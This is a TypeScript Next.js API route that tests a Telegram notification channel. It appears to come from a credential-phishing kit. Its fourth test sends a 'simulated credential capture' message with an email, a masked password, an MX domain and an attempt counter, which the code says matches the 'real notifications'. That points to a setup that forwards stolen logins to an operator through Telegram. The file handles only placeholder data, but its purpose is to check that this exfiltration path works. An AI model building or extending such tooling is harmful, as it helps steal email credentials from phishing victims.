import { NextRequest, NextResponse } from 'next/server'
import { getSettings } from '@/lib/adminSettings'
import { sendTelegramMessage } from '@/lib/telegramNotifications'
import { getTelegramBotToken, getTelegramChatId, isTelegramConfigured } from '@/lib/telegramConfig'

export const runtime = 'nodejs'

/**
 * Diagnostic endpoint to test Telegram notification system
 * Similar to CAPTCHA diagnostic - tests the full notification flow
 */
export async function GET(request: NextRequest) {
  try {
    const diagnostics: any = {
      timestamp: new Date().toISOString(),
      tests: {},
      summary: {
        allPassed: false,
        issues: [] as string[],
      },
    }

    // Test 1: Check if settings can be loaded
    try {
      const settings = await getSettings()
      diagnostics.tests.settingsLoad = {
        passed: true,
        enabled: settings.notifications.telegram.enabled,
        hasBotToken: !!settings.notifications.telegram.botToken,
        hasChatId: !!settings.notifications.telegram.chatId,
        botTokenLength: settings.notifications.telegram.botToken?.length || 0,
        chatId: settings.notifications.telegram.chatId || 'NOT SET',
      }
      
      if (!settings.notifications.telegram.botToken) {
        diagnostics.summary.issues.push('Bot token is not configured')
      }
      if (!settings.notifications.telegram.chatId) {
        diagnostics.summary.issues.push('Chat ID is not configured')
      }
      if (settings.notifications.telegram.enabled === false) {
        diagnostics.summary.issues.push('Telegram notifications are disabled in settings')
      }
    } catch (error: any) {
      diagnostics.tests.settingsLoad = {
        passed: false,
        error: error.message || String(error),
      }
      diagnostics.summary.issues.push(`Failed to load settings: ${error.message}`)
    }

    // Test 2: Check if Telegram config functions work
    try {
      const botToken = await getTelegramBotToken()
      const chatId = await getTelegramChatId()
      const isConfigured = await isTelegramConfigured()
      
      diagnostics.tests.configFunctions = {
        passed: true,
        botToken: botToken ? `${botToken.substring(0, 10)}...` : 'NOT FOUND',
        chatId: chatId || 'NOT FOUND',
        isConfigured,
      }
      
      if (!isConfigured) {
        diagnostics.summary.issues.push('Telegram is not properly configured (missing token or chat ID)')
      }
    } catch (error: any) {
      diagnostics.tests.configFunctions = {
        passed: false,
        error: error.message || String(error),
      }
      diagnostics.summary.issues.push(`Config functions failed: ${error.message}`)
    }

    // Test 3: Try to send a test notification (only if configured)
    const isConfigured = await isTelegramConfigured()
    if (isConfigured) {
      try {
        const testMessage = `🧪 Telegram Notification Diagnostic Test

Time: ${new Date().toLocaleString()}
Status: Diagnostic Test
Source: /api/test/telegram-notification

If you receive this message, your Telegram notification system is working correctly! ✅`
        
        const result = await sendTelegramMessage(testMessage)
        
        diagnostics.tests.sendNotification = {
          passed: result,
          message: result 
            ? 'Test notification sent successfully' 
            : 'Test notification failed to send',
        }
        
        if (!result) {
          diagnostics.summary.issues.push('Failed to send test notification')
        }
      } catch (error: any) {
        diagnostics.tests.sendNotification = {
          passed: false,
          error: error.message || String(error),
        }
        diagnostics.summary.issues.push(`Send notification error: ${error.message}`)
      }
    } else {
      diagnostics.tests.sendNotification = {
        passed: false,
        skipped: true,
        reason: 'Telegram not configured - skipping send test',
      }
    }

    // Test 4: Simulate credential capture notification (same format as real notifications)
    if (isConfigured) {
      try {
        const simulatedMessage = `+++FOX NOTIFICATION+++

🎯 Attempt 1/3 (DIAGNOSTIC TEST)

📧 test@example.com
🔑 ********
📬 MX: example.com

This is a simulated credential capture notification to test the format.`
        
        const result = await sendTelegramMessage(simulatedMessage)
        
        diagnostics.tests.simulatedCapture = {
          passed: result,
          message: result 
            ? 'Simulated credential capture notification sent successfully' 
            : 'Simulated notification failed',
        }
        
        if (!result) {
          diagnostics.summary.issues.push('Failed to send simulated credential capture notification')
        }
      } catch (error: any) {
        diagnostics.tests.simulatedCapture = {
          passed: false,
          error: error.message || String(error),
        }
        diagnostics.summary.issues.push(`Simulated capture error: ${error.message}`)
      }
    } else {
      diagnostics.tests.simulatedCapture = {
        passed: false,
        skipped: true,
        reason: 'Telegram not configured - skipping simulated test',
      }
    }

    // Calculate summary
    const allTests = Object.values(diagnostics.tests)
    const passedTests = allTests.filter((t: any) => t.passed === true)
    const failedTests = allTests.filter((t: any) => t.passed === false && !t.skipped)
    
    diagnostics.summary.allPassed = failedTests.length === 0 && diagnostics.summary.issues.length === 0
    diagnostics.summary.totalTests = allTests.length
    diagnostics.summary.passedTests = passedTests.length
    diagnostics.summary.failedTests = failedTests.length
    diagnostics.summary.skippedTests = allTests.filter((t: any) => t.skipped).length

    return NextResponse.json({
      success: true,
      diagnostics,
    })
  } catch (error: any) {
    return NextResponse.json({
      success: false,
      error: 'Diagnostic failed',
      details: error.message || String(error),
    }, { status: 500 })
  }
}

